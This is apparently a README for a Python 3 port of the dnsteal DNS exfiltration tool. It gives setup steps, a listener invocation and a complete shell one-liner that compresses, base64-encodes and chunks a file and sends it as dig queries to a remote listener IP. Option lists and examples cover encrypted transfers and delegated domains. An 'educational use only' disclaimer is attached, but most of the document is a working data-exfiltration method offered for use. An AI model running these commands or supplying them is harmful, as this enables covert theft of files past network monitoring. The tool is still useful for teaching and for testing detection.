# DNSteal Python 3 Port

A modern Python 3 port of [m57/dnsteal](https://github.com/m57/dnsteal) with enhanced reliability and educational features.

## Features

- **Python 3 compatibility** - Complete rewrite for modern Python
- **Auto-optimized chunks** - Dynamic DNS query sizing prevents errors  
- **Contextual help** - Shows working commands for your configuration
- **Cross-platform** - Reliable `fold` instead of problematic `sed`
- **Educational focus** - Built for controlled training environments

## Quick Start

```bash
# Install dependencies
sudo apt-get install python3 dnsutils  # Ubuntu/Debian
sudo yum install python3 bind-utils     # CentOS/RHEL

# Start listener (requires root for port 53)
sudo python3 dnsteal.py 0.0.0.0 -z -v

# Send files (copy command shown by server)
f=file.txt; s=6; b=30; c=0; for r in $(for i in $(gzip -c "$f" | base64 -w0 | fold -w30); do if [[ "$c" -lt "6" ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\n$i-."; c=1; fi; done); do dig +noidnin @192.168.1.100 +short "$r$(echo -ne "$f" | base64 -w0 | tr -d '=').$RANDOM.zz"; done

# Stop and save
# Press Ctrl+C to flush received data to disk
```

## Usage

```
python3 dnsteal.py [listen_ip] [options]

Options:
  -z              Enable gzip compression  
  -v              Verbose output
  -p PASSWORD     Encrypt with AES-256-CBC
  -d DOMAIN       Custom domain (default: zz)
  -s N            Subdomains per query (auto-adjusted)  
  -b N            Bytes per subdomain (auto-adjusted)
  -o DIR          Output directory
```

## Examples

**Basic lab transfer:**
```bash
sudo python3 dnsteal.py 192.168.1.100 -z
```

**Delegated domain:**
```bash
sudo python3 dnsteal.py 0.0.0.0 -z -d tunnel.lab.local
```

**Encrypted transfer:**
```bash
sudo python3 dnsteal.py 0.0.0.0 -z -p "secret123"
```

## Educational Use Only

⚠️ **This tool is for authorized cybersecurity training and research only.**

- Use in controlled lab environments
- Obtain proper authorization before testing
- Comply with local laws and regulations

## License

Educational use only. Based on original work by [m57](https://github.com/m57/dnsteal).
